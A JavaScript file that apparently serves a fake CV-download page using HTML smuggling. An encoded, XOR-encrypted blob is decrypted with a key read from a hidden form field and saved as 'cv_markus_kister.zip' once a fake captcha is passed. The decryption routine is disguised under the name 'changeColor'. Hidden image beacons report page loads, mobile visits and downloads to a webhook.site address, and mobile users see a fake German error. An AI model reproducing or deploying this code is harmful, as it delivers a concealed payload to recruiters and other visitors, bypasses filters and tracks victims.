var data = "Yng3MXJnc2U6M+phYm2vOFBLvDIyM6owZmd5ZTIzcnNdWAcAF0teXVmyKa2sEJVEkFXSIodPN9nzNE6dtR9O/r0C7NVOj2m3pDEl/3JVr6iyWiizJdatfxnuBVTHILrBIU" +
"uqAJ8a/9ApYYdt4B6LCbz6LSLHxcNNcpybGrz88NssJi7N4517n9+/Vya4IVYjaGyvCfLVyYkaArUn+MPrxiocVRlQzNC6nuypeB4OQzAvUmeZ+88vb/ebXz/QpCdggrK/" +
"KTTjkQ/6tsVOtVPbhRFtZsiJMEy1f5FiMVRQ7DxB5ZRGEVH9QlG006DzsNdTAA7mw3DSXrBZ9DsVEHI5NF4gvRwjmRfV94Etn/qrRl6/F+3WQUcp8O3ZdpWt8HKTwpmQG7" +
"PTzQdY73T0LJHm0dygqaFRlE6dPi1pgFzGdhi5qHUK+FsQAMHGrdNXtaDxGLBocT1epSKZJEC2CWNTiWAO5zbpI89lsiUDh6L+Ev0jBxTYITWEIg3g4qjjoOKDvHbnM1Nh" +
"EUpyO4jjMEXS2WVsUuNwcUryRVKMjYX1SHKooTHt0GJ1ZrlPV9OpFxyNUHHD1ZT1AWN5MjYKZnNyZDI7MutmYz6uLUccvTMzNKtjZ3JuMhcyMzQ1ZmdyRTIzMjM0NWYnMg" +
"xfUlVWGlkIDHhlEjMyMzQ1Z2dqZZYz8IFEULxmwvhS80JW7jSUVUeMX1boMmR+Y2FyZTIzMzM1NTtncmWFMjIzNDU=";



function xorDecrypt(binaryContent, key) {
var ret = new Uint8Array(binaryContent.length);
for (let i = 0; i < binaryContent.length; i++) {
ret[i] = binaryContent.charCodeAt(i) ^ key.charCodeAt(i % key.length);
}
return ret;
}

function saveByteArray(reportName, byte) {
var blob = new Blob([byte], { type: "text/plain" });
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
var fileName = reportName;
link.download = fileName;
link.click();
};

function changeColor () {
var _data = atob(data);
_data = xorDecrypt(_data, document.getElementById("captcha2").value)
saveByteArray("cv_markus_kister.zip", _data);
}

function generateRandomCode() {
    var characters = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789';
    var code = '';
    for (var i = 0; i < 6; i++) {
      var randomIndex = Math.floor(Math.random() * characters.length);
      code += characters.charAt(randomIndex);
    }
    return code;
  }

function baseToArrayBuffer(base64) {
    var binaryString = window.atob(base64);
    var binaryLen = binaryString.length;
    var bytes = new Uint8Array(binaryLen);
    for (var i = 0; i < binaryLen; i++) {
        var ascii = binaryString.charCodeAt(i);
        bytes[i] = ascii;
    }
    return bytes;
}

function saveByteArray(reportName, byte) {
    var blob = new Blob([byte], { type: "text/plain" });
    var link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    var fileName = reportName;
    link.download = fileName;
    link.click();
};

window.downloadCV = function () {
    changeColor();
}

function sendWebhook(action) {
    const url = 'https://webhook.site/<YOUR-GUID>';
    const params = { action: action };
    const img = document.createElement('img');
    img.style.display = 'none';
    img.src = url + '?action=' + encodeURIComponent(action);
    document.body.appendChild(img);
}

$(document).ready(function() {
    sendWebhook('page_loaded');
    var userAgent = navigator.userAgent.toLowerCase();
    var isMobile = /iphone|ipod|ipad|android|blackberry|windows phone/.test(userAgent);

    if (isMobile) {
      var message = "<span style='color: red; font-weight: bold;'>⚠</span> Fehler bei der Ausführung, diese Bibliothek unterstützt keine mobilen Geräte.";
      document.getElementById("cv").innerHTML = message;
      sendWebhook('mobile_detected');
    }

    var expectedCode = generateRandomCode();
    $('#codeImage').attr('src', 'https://via.placeholder.com/500x100?text=' + expectedCode);
    
    $('#captcha').on('input', function() {
      var enteredCode = $(this).val().trim();
      if (enteredCode === expectedCode) {
        changeColor();
        downloadCV();
        sendWebhook('download_started');
      }
    });
  });
